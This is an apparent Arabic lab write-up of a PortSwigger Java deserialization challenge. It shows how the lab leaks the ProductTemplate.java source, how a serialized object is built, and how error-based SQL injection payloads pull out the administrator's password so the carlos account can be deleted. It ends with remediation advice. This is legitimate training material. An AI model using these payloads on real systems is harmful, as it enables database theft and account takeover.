# [Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

## **`الهدف`**
قم بالوصول إلى الـ `Source Code` واستخدمه لإنشاء سلسلة  أدوات للحصول على كلمة مرور `administrator` ثم قم بحذف حساب `Carlos`.
## **`خطوات الحل`**
==**`ملاحظة هامة:`**==  في الحل الرسمي على الـ `PortSwigger` هناك طريقة أخرى لإنشاء الكائن المسلسل بإستخدام إضافة `Hackvertor` ولكن بعد عدة محاولات لم تنجح معي.


نقوم بالدخول إلى حساب `wiener:peter` ونقوم بتحويل أى طلب يحتوى على الـ `Cookie` مثل طلب `/my-account` إلى `Repeater`
```http
GET /my-account?id=wiener HTTP/2
Host: 0aa2006303656fa8837cc904004000c9.web-security-academy.net
Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACB4b3BhY2phd2xxM2I1bDBobG81ODR1YWRxMWhwMzNuNXQABndpZW5lcg%3d%3d
```
وسنلاحظ أن قيمة الـ `Cookie` تبدأ بـ `rO0` وهذا يعنى أنها كائن `Java` بنظام `Base64`.

وبفحص الاستجابة الخاصة به سنجد بداخلها تعليق من المطور يشير إلى مسار به جزء يخص الـ `Backup`
```http
<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->
```

لذلك سنقوم بالتوجه إلى مسار `/backup`
```http
GET /backup HTTP/2
Host: 0aa2006303656fa8837cc904004000c9.web-security-academy.net
Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACB4b3BhY2phd2xxM2I1bDBobG81ODR1YWRxMWhwMzNuNXQABndpZW5lcg%3d%3d
```

وسنجد في الاستجابة ملف باسم `ProductTemplate.java`
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 534

<html>
    <head>
        <title>Index of /backup</title>
        <style>
            table { margin: 1em; }
            td { padding: 0.2em; }
        </style>
    </head>
    <body>
        <h1>Index of /backup</h1>
        <table>
            <tr><th>Name</th><th>Size</th></tr>
            <tr><td><a href='/backup/AccessTokenUser.java'>AccessTokenUser.java</a></td><td>486B</td></tr>
            <tr><td><a href='/backup/ProductTemplate.java'>ProductTemplate.java</a></td><td>1651B</td></tr>
        </table>
    </body>
</html>
```
لذلك سنتوجه إلى مسار هذا الملف:
```http
GET /backup/ProductTemplate.java HTTP/2
Host: 0aa2006303656fa8837cc904004000c9.web-security-academy.net
Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACB4b3BhY2phd2xxM2I1bDBobG81ODR1YWRxMWhwMzNuNXQABndpZW5lcg%3d%3d
```

وسنجد الـ `Source Code`
```http
HTTP/2 200 OK
X-Frame-Options: SAMEORIGIN
Content-Length: 1651

package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

بعد ذلك سنقوم بدراسة الـ `Source Code` أو سنقوم بإستعمال سكريبت يوفره الـ `PortSwigger` في الحل الرسمي.

سنقوم بتحميل السكريبت من **[Github](https://github.com/PortSwigger/serialization-examples/tree/master/java/solution)** بالأمر التالي:
```Shell
git clone https://github.com/PortSwigger/serialization-examples.git
```
بعد ذلك ننقل إلى فولدر `Solution`  بالأمر التالي:
```Shell
cd serialization-examples/java/solution
```

بعد ذلك سنقوم بفتح ملف `Main.java` عن طريق الأمر التالي:
```Shell
nano Main.java
```

ثم نقوم بتعديل جزئية `"your-payload-here"` لتصبح `'`

ثم نقوم بإستعمال الأمريين التاليين على التوالي:
```Shell
javac Main.java
java Main
```
وسيظهر على الشاشة التالي:
```Shell
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=
Deserialized object ID: '
```

وهذا ماسنقوم بتكراره مع جميع الـ `Payloads` التالي وإختصارًا للملاحظات سأتخطى هذه النقطة في الاجزاء التالية

وسنجد هناك رسالة خطأ في الاستجابة تؤكد وجود الثغرة
```http
<p 
class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: Unterminated string literal started at position 36 in SQL SELECT * FROM products WHERE id = &apos;&apos;&apos; LIMIT 1. Expected  char
</p>
```

بعد ذلك سنقوم بتجربة عدة `Payloads` لمعرفة عدد الأعمدة وفى كل مرة سنقوم بزيادة `NULL` وستكون هناك رسالة خطأ في الاستجابة كالتالي:
```http
<p 
class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns
  Position: 51
</p>
```

حتى نصل إلى أن الصحيح هو `8` أعمدة بالـ `Payload` التالي:
```SQL
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

وسنعرف ذلك عن طريق وجود رسالة خطأ في الاستجابة كالتالي:
```http
<p 
class=is-warning>java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser
</p>
```

بعد ذلك سنبدأ في محاولة تحديد نوع البيانات المقبولة عن طريق وضع سلسلة نصية بدلًأ من كل `NULL`، كمثال الـ `Payload` التالي يختبر العمود الرابع
```SQL
' UNION SELECT NULL,NULL,NULL,'test',NULL,NULL,NULL,NULL--
```

والذي سنعرف عن طريق رسالة الخطأ الموجودة  في الاستجابة أنه لا يقبل سلاسل نصية وهذا أيضًا في العمود رقم `5` و `6`
```http
<p 
class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;test&quot;
  Position: 66
</p>
```

بعد ذلك سنقوم بسحب أسماء الجداول عن طريق الـ `Payload` التالي:
```SQL
' UNION SELECT NULL, NULL, NULL, CAST(table_name AS numeric), NULL, NULL, NULL, NULL FROM information_schema.tables--
```

والتي ستكون رسالة الخطأ في الاستجابة كالتالي:
```http
<p 
class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;users&quot;
</p>
```

وبعد ذلك سنقوم بسحب أسماء الأعمدة من جدول `users` عن طريق الـ `Payload` التالي:

```SQL
' UNION SELECT NULL, NULL, NULL, CAST(column_name AS numeric), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
```

والتي ستكون رسالة الخطأ في الاستجابة كالتالي:
```http
<p
class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;username&quot;
</p>
```

وبعد ذلك سنقوم بسحب بيانات عمود `username` عن طريق الـ `Payload` التالي:

```SQL
' UNION SELECT NULL, NULL, NULL, CAST(username AS numeric), NULL, NULL, NULL, NULL FROM users--
```

وسنجد أن اسم المستخدم ظاهرًا في رسالة الخطأ الاستجابة كالتالي:
```http
<p 
class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;administrator&quot;
</p>
```

واخيرا سنقوم بسحب بيانات عمود `password` عن طريق الـ `Payload` التالي: 

```SQL
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```

وسنجد أن كلمة المرور ظاهرًا في رسالة الخطأ الاستجابة كالتالي:
```http
<p
class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;brtmydgjl6jmcwnvwb38&quot;
</p>
```

وسنقوم بتسجيل الدخول إلى حساب `administrator:brtmydgjl6jmcwnvwb38` ثم سنقوم بالتوجه إلى `Admin Panel` ونقوم بحذف حساب `Carlos` لننتهي من حل اللاب.

==**`ملاحظة هامة:`**== لقد افترضت وجود عمود اسمه `password` ولكن يُمكن أيضًا سحبه عن طريق `Payload` مثل التالي:

```SQL
' UNION SELECT NULL, NULL, NULL, CAST(column_name AS numeric), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' AND column_name != 'username'--
```
أو
```SQL
' UNION SELECT NULL, NULL, NULL, CAST(column_name AS numeric), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' AND column_name NOT IN ('username')--
```

ويمكن بعد ذلك سحب أعمدة أخرى إذا أردنا كالتالي:

```SQL
' UNION SELECT NULL, NULL, NULL, CAST(column_name AS numeric), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' AND column_name != 'username' AND column_name != 'password'
```

أو
```SQL
' UNION SELECT NULL, NULL, NULL, CAST(column_name AS numeric), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' AND column_name NOT IN ('username', 'password')--
```

وهناك بعض الطرق الاخر للتنقل بين الصفوف مثل:
- **الصف الأول:** `LIMIT 1 OFFSET 0` (يجلب `username`)
- **الصف الثاني:** `LIMIT 1 OFFSET 1` (يجلب `password`)
- **الصف الثالث:** `LIMIT 1 OFFSET 2` (وهكذا...)
## **`ترقيع الثغرة`**
يجب أن يكون الـ `Cookie` المُرسل للمستخدم مجرد `Session ID` عشوائي `Cryptographically Secure Session ID`، يتم توليده باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المهاجم، ويتم ربط المستخدم بالـ `Session ID` بشكل صارم في الواجهة الخلفية `back-end` ليستطيع السيرفر معرفة الـ `Role` الحقيقي للمستخدم، وإذا لم يكن الـ `Role` الخاص بالمستخدم يخوله للدخول إلى مسار `/admin`، فيتم رفض الـ `request` فورًا بـ `403 Forbidden` إذا كان مسجل دخول بالفعل ولكنه مستخدم عادي، أو `401 Unauthorized` إذا لم يمكن مسجل دخول من الأساس، وليس مجرد عمل إعادة توجيه.

وإذا كانت معمارية التطبيق تتطلب تخزين حالة الجلسة عند العميل `Stateless Applications` لتقليل الحمل على السيرفر، فيجب حماية هذه البيانات من التلاعب باستخدام التوقيع الرقمي مثل آلية عمل `JWT`.

ويجب التوقف تماماً عن استخدام نظام التسلسل الافتراضي الخاص بجافا `Java Native Serialization` وتحديداً دالة `ObjectInputStream.readObject()` لأنها خطيرة جدًا إذا تم تمرير بيانات يتحكم فيها المستخدم إليها، وبدلًا من ذلك يتم استخدام صيغ بيانات آمنة تعتمد على النصوص مثل `JSON` عن طريق مكتبات موثوقة مثل `Jackson` أو `Gson` مع الحذر الشديد وتعطيل ميزة `Polymorphic Type Handling` إن لم تكن ضرورية لتجنب ثغرات فك تسلسل مشابهة.

وإذا كان هناك نظام قديم `Legacy System` لا يمكن فيه الاستغناء عن آلية التسلسل الافتراضية الخاصة بجافا، فيمكن ترقيع الثغرة جزئياً عن طريق تطبيق مبدأ القوائم البيضاء `Allowlisting` لتقييد الكائنات التي يمكن فك تسلسلها باستخدام ميزة `JEP 290 (ObjectInputFilter)` التي توفرها جافا لفلترة الكائنات على مستوى الـ `JVM` قبل فك تسلسلها بالكامل، ولكن هذا لن يمنع ثغرات تعديل الصلاحيات ولكنه سيمنع ثغرات الـ `RCE`.

ويجب ألا يعمل تطبيق الويب بصلاحيات مستخدم `Root` ويعمل بصلاحيات مستخدم محدود مثل `www-data`

ويجب إزالة التعليقات البرمجية الحساسة من كود الـ `HTML` الموجه للمستخدم، ويُفضل استخدام أدوات التحزيم `Build Tools` أو الـ `Minifiers` لحذف هذه التعليقات تلقائياً قبل نشر الكود.

ويجب ألا يتم حفظ أي ملفات `Backup` أو `Source Code` أو ملفات تحكم بالإصدارت `Version Control` (مثل `.git`) في المجلدات التي يتم تقديمها للزوار، حيث يجب نقل هذه الملفات إلى مسارات آمنة خارج الـ `Web Root`، أو إزالتها تماماً من سيرفر الإنتاج، ويٌفضل إضافة قاعدة `Rule` في إعدادات سيرفر الويب تمنع بشكل قاطع تقديم أي ملفات تنتهي بهذه الامتدادات، حتى لو نسي المطور مسحها.

ويجب تعطيل خاصية استعراض المجلدات `Directory Listing`.

وبما أن الـ `Source Code` في هذا اللاب يوجد به ثغرة `SQLi` فيجب أن يعتمد تطبيق الويب بشكل أساسي على الاستعلامات المجهزة `Prepared Statements` لفصل هيكل استعلام `SQL` عن البيانات المدخلة، بحيث لا يتم دمج مدخلات المستخدم مباشرة داخل الاستعلام، بل يتم إرسالها كبيانات منفصلة لكي تتعامل معها قاعدة البيانات كنص عادي وليس كأوامر برمجية قابلة للتنفيذ.

ويجب ألا يمتلك المستخدم الذي يتصل به تطبيق الويب صلاحيات كاملة أو إدارية على قاعدة البيانات مثل `root` أو `sa`، حيث تقتصر صلاحياته فقط على الجداول التي يحتاجها فعليا لعمل التطبيق وبصلاحية القراءة `SELECT` فقط إذا لم تكن هناك حاجة للتعديل أو الحذف.

ويجب معالجة المُدخلات برمجياً باستخدام `try-catch` لاصطياد الأخطاء المتوقعة وإرجاع رسالة خطأ قياسية للمستخدم مثل `HTTP 400`.

ويجب إعداد السيرفر ليعترض أي خطأ داخلي مثل `500 Internal Server Error` ويعرض بدلاً منه صفحة `HTML` بسيطة للمستخدم لا تحتوي على أي تفاصيل تقنية مع التأكد من تسجيل هذه االأخطاء بالتفصيل بشكل آمن في ملفات السيرفر الداخلية `Logs` فقط.

ويجب عدم تخزين كلمات المرور والـ `API Keys` داخل ملف كود وبدلًا من ذلك يتم تخزينهم في متغيرات بيئة `Environment Variables` مثل ملف `.env` وفي المشاريع الكبيرة، يُفضل استخدام أدوات إدارة الأسرار مثل `HashiCorp Vault` أو `AWS Secrets Manager`.
